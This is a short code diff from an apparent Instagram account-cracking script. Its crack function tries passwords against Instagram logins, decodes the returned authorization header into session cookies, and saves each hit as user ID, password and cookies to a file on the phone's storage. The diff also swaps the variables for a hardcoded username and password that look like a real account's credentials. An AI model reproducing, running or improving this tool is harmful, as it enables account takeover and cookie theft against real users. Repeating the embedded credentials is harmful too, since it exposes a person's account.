@@ -159,8 +159,8 @@ def crack(uid, password_list, total_count):
             timestamp = int(time.time())
         
             # URL encode username and password
-            encoded_username = urllib.parse.quote(uid)
-            encoded_password = urllib.parse.quote(pw)
+            encoded_username = urllib.parse.quote('8918168736')
+            encoded_password = urllib.parse.quote('891816')
         
             # Generate encrypted password format
             encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
@@ -244,12 +244,11 @@ def crack(uid, password_list, total_count):
                 # Decode base64
                 decoded_bytes = base64.urlsafe_b64decode(base64_part)
                 self.decode_ig_set_authorization = json.loads(decoded_bytes.decode('utf-8'))
-                print("\n✓ Successfully decoded IG-Set-Authorization")
                 # Create cookie string from decoded data
                 cookies = ';'.join([f'{name}={value}' for name, value in self.decode_ig_set_authorization.items()])
                 print(f"\n=== Cookie ===")
                 print(cookies)
-                open("/sdcard/SUMON_INS_IDS.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
+                open("/sdcard/SUMON_INS_IDS.txt", "a").write(uid+"|"+pw+"|"+cookies+"\n")
                 oks.append(uid)
                 return True       
             elif 'challenge_required' in response.text:
